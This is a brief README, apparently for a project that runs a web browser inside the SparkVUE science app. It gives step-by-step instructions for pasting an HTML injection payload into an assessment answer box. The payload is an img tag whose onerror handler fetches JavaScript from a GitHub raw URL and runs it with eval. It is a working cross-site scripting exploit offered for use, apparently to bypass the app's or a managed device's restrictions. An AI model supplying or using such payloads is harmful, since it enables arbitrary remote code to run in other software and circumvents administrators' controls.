# Browser
A browser for sparkvue
Instructions:
1. Open SparkVUE from your app launcher
2. Click "Build New Experiment"
3. Click the full grey box (or the split ones, it doesn't really matter)
4. Click the paper with the checkmarks, and click "Add an Assessment"
5. Choose "Multiple Choice", and paste this into one of the "Answer" boxes:
```
<img src=# onerror='
  fetch(`https://raw.githubusercontent.com/cam0studios/browser/main/main.js`)
  .then(r => r.text())
  .then(c => eval(c));
'>
```
For easy future use:
1. Click "save" and go to the hamburger menu
2. Hit "Save As", choose a name
3. Next time you open up SparkVUE, click "Open Saved Experiment" and click that file
